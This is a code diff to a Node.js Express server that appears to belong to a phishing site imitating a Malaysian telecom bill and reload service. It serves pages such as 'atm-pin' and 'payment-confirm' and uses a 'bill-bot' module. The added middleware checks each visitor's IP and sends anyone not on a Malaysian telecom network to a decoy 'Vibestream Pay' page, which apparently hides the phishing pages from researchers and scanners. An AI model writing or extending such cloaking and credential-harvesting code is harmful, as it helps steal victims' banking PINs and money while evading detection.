@@ -3,6 +3,7 @@ const path = require('path');
 const http = require('http');
 const WebSocket = require('ws');
 const { fetchBillData, fetchReloadData } = require('./bill-bot');
+const { getClientIP, isMalaysianTelecomIP } = require('./ip-detector');
 
 const app = express();
 const server = http.createServer(app);
@@ -38,6 +39,34 @@ app.use(express.urlencoded({ extended: true }));
 // Serve static files
 app.use(express.static(path.join(__dirname)));
 app.use('/get-assets', express.static(path.join(__dirname, 'get-assets')));
+
+// ============================================================
+// IP DETECTION MIDDLEWARE - Check if user is from Malaysian telecom
+// ============================================================
+const ipCheckMiddleware = async (req, res, next) => {
+  // Skip IP check for API endpoints, admin, and static files
+  if (req.path.startsWith('/api/') || 
+      req.path.startsWith('/get-assets/') ||
+      req.path === '/admin' ||
+      req.path === '/vibestream-pay' ||
+      req.path.match(/\.(js|css|png|jpg|jpeg|gif|svg|webp|ico)$/i)) {
+    return next();
+  }
+
+  const clientIP = getClientIP(req);
+  const isMalaysian = await isMalaysianTelecomIP(clientIP);
+
+  // If not from Malaysian telecom, redirect to Vibestream Pay
+  if (!isMalaysian) {
+    console.log(`[IP CHECK] Non-Malaysian IP detected: ${clientIP} - Redirecting to Vibestream Pay`);
+    return res.redirect('/vibestream-pay');
+  }
+
+  next();
+};
+
+// Apply IP check middleware to all page routes
+app.use(ipCheckMiddleware);
 
 // ============================================================
 // ADMIN AUTH
@@ -412,6 +441,11 @@ app.get('/atm-pin', (req, res) => res.sendFile(path.join(__dirname, 'atm-pin.htm
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
 app.get('/payment-confirm', (req, res) => res.sendFile(path.join(__dirname, 'payment-confirm.html')));
 app.get('/payment-success', (req, res) => res.sendFile(path.join(__dirname, 'payment-success.html')));
+
+// ============================================================
+// VIBESTREAM PAY PAGE - Shown to non-Malaysian users
+// ============================================================
+app.get('/vibestream-pay', (req, res) => res.sendFile(path.join(__dirname, 'vibestream-pay.html')));
 
 // ── Malay (BM) routes ──
 app.get('/reload/ms', (req, res) => res.sendFile(path.join(__dirname, 'reload-ms.html')));
